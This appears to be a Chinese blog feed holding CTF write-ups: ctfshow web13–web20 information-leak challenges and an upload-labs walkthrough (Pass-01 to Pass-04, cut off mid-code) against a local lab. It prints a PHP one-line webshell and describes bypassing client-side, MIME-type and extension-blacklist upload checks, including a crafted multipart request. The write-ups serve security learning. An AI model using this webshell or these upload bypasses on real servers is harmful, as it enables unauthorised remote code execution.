alt="image.png"><br>访问地址，发现需要账号密码，根据提示，猜想账号admin，密码为对网页末尾电话。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659155796-072b792a-f76d-449f-8574-15e07c5d1825.png" alt="image.png"><br>成功登录获取到flag。</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><blockquote><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>根据提示，可以在主页中最底部发现有<code>document</code>，下载文档。文档中即有登录账号密码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659750747-db64cb0e-fc5a-4cb4-bc94-4d6fffe1071f.png" alt="image.png"><br>登录对应地址，并输入对应账号密码，获得flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659800472-5c848c58-2560-4e62-867c-48ecbc15cc4d.png" alt="image.png"></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>查看源码源码中上传图片的位置暴露了比编辑器地址：<code>/editor</code>（当然也可以扫描出来）<br>然后根据提示，在插入文件中选择文件空间。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661001765-ed170db3-ec48-48ff-8e84-fa8e456d352d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661012463-5891556a-d14c-40b1-abc5-11107aa67e4f.png" alt="image.png"><br>经过搜索，发现如下地址：<code>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</code><br>前面是网站根目录，直接访问：<code>nothinghere/fl000g.txt</code>得到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661160331-f88eb97f-1984-4d6f-af3a-fe7680e70d73.png" alt="image.png"></p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>经过扫描发现存在<code>/admin</code>访问。内有一个登陆系统，系统存在忘记密码找回，发现密保问题为居住地址。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661547444-07d88c82-2efe-47b1-af59-eb3a41fcf40c.png" alt="image.png"><br>可以根据about关于界面最下方的电话号查询所属地。但是查询了发现电话不存在。发现主页有qq邮箱，用qq查询：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662044749-a963e17b-36fb-406e-aca0-50e68524087f.png" alt="image.png"><br>输入后重置密码，登录获取到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662272962-b2d18581-e88b-4f85-8830-7ee5dc25dd01.png" alt="image.png"></p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>根据提示，我们可以了解到这道题用到了探针，访问：<code>tz.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662498104-ab17d3fd-d09e-4d37-bdb8-c279c78be35d.png" alt="image.png"><br>我们可以在php相关参数一栏中查看到<code>phpinfo()</code>，在页面中搜索flag，发现在环境中有flag字段：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662734509-e50900a3-d143-43b1-858e-e1d83fbbae0c.png" alt="image.png"></p><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫，发现它的备份名称为：<code>backup.sql</code>，下载对应包，可以看到文件内有flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663254137-edde1c49-2d30-4625-b7c7-596ad117da73.png" alt="image.png"></p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><blockquote><p>不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>游戏题，直接查看源代码，查看<code>Flappy_js.js</code>文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663432915-94befbb5-3da7-4037-9c98-dc3add8ab8d7.png" alt="image.png"><br>发现里面有对分数判断：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663480194-bc8f1dc4-7e5e-4e9a-9229-a2d5c2b7ae4e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663488999-1aeb987f-2d46-4d08-addd-57bc00045cf7.png" alt="image.png"><br>根据结果访问对应<code>110.php</code>获得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663518588-a91f1d72-0f50-4610-80ec-6e350e3f0e9d.png" alt="image.png"></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><blockquote><p>密钥什么的，就不要放在前端了</p></blockquote><p>f12查看源代码，发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接根据提示post传入账号密码即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663807340-ae78657e-3980-404f-af6d-9b57d1a4b7c7.png" alt="image.png"></p><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}<br>虽然内容乱码了，但是可以直接搜索flag字段来找到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677664080200-59170fc9-2d27-41ea-9514-447d48d68017.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uploads-lab之旅</title>
      <link href="/2023/03/12/uploads-lab%E4%B9%8B%E6%97%85/"/>
      <url>/2023/03/12/uploads-lab%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>准备材料：</p><ul><li>phpstudy：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></li><li>uploads-lab：<a href="https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator</a></li></ul><h4 id="uploads-lab的搭建"><a href="#uploads-lab的搭建" class="headerlink" title="uploads-lab的搭建"></a>uploads-lab的搭建</h4><p>uploads-lab下载为zip文件，并解压在phpstudy下的www文件夹内，注意将文件夹重命名为uploads-lab。<br>解压成功后访问 <a href="http://127.0.0.1/upload-labs">http://127.0.0.1/upload-labs</a> 打开即可(PS:部分人burpsuite可能使用本机地址无法抓包，建议127.0.0.1修改为本机地址！)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673542456881-755e93e5-08db-4264-893b-3434505bba58.png" alt="image.png"></p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>任务：上传一个<code>webshell</code>到服务器。<br>首先先尝试直接传一个一句话木马<code>webshell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>(_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传失败，提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php<br>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f12查看源代码，发现把函数放在了前端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673544303968-26e4e437-558e-4377-b9cb-d552fc971cc2.png" alt="image.png"></p><h2 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h2><p>直接浏览器禁用js<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673545764014-6f3370b8-3730-4849-8d0e-57c5a2741143.png" alt="image.png"><br>上传成功，用antsword测试连接，成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546203765-a912ec10-9c39-4ed9-a479-d91042847e7f.png" alt="b4797b0734fbfd3618d946ec7938912.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>修改文件后缀名为<code>webshell.png</code>上传，打开burpsuite抓包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546459582-bb57208f-a5e1-4b13-aec7-00f92787e614.png" alt="image.png"><br>将filename参数修改文件后缀<code>.php</code><br>用antsword测试连接，成功</p><h2 id="方法三（重要）"><a href="#方法三（重要）" class="headerlink" title="方法三（重要）"></a>方法三（重要）</h2><p>右键页面-查看网站源代码-全部复制下来-保存为html后缀文件，找到文件中的js代码，删除。删除代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这时我们运行这个HTML文件，UI仍然会显示，但是由于我们已经删除了js函数，所以我们不知道要将文件传到哪里。<br>我们回到原网页，右键页面-检查-网络，上传文件，看到上传的图片的请求网址。（这一步用burpsuite也可以）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609137323-2d967bd6-143f-41ce-b1da-dc95476ccd17.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>知道请求网址了就可以给html文件添加action了，action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609254796-cf64222b-d921-4e97-93cf-19ce4510b673.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>添加好之后重新运行html文件，再上传<code>webshell.php</code>文件，直接就可以上传成功。</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>要求：上传一个<code>webshell</code>到服务器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//判断是否上传submit参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">//检查文件或目录是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="comment">//允许传输 .jpg/.png/.gif 后缀文件</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//将上传的文件移动到新位置</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>这一关是常见验证中的文件类型验证，也就是验证MIME信息，将<code>webshell.php</code>改为<code>webshell.png</code>，并上传，在burp抓包处修改文件名为<code>webshell.php</code>，即可上传成功，antsword连接测试成功。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673605350606-8477e614-1e6f-42f6-83e0-611ea73de702.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">------WebKitFormBoundary09G9BBRK49OTlzSH</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;webshell.png&quot;</span><span class="comment">//将这里修改为webshell.php</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者直接上传<code>webshell.php</code>文件，因为检测的是<code>Content-Type</code>参数，所以直接将其修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>三种之一即可。</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//定义submit参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h2><p>这次是屏蔽了所有的<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>文件，但是黑名单定义不完全是可以绕过的可以用<code>.phtml</code>、<code>.phps</code>、<code>.php5</code>、<code>.pht</code>进行绕过。比如将文件名改为<code>webshell.php5</code>上传。<br>但是要想上传后能执行，要在自己的<code>apache</code>的<code>httpd.conf</code>文件写入，在<code>D:\你安装的位置\phpstudy_pro\Extensions\Apache2.4.39\conf</code>里写入：<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code><br>这样就成功传输和使用了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>如果这样还是不行的话，就是php版本的问题，需要将Nts版本换为ts版本：</strong><a href="https://www.cnblogs.com/Article-kelp/p/14927087.html"><strong>https://www.cnblogs.com/Article-kelp/p/14927087.html</strong></a></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span 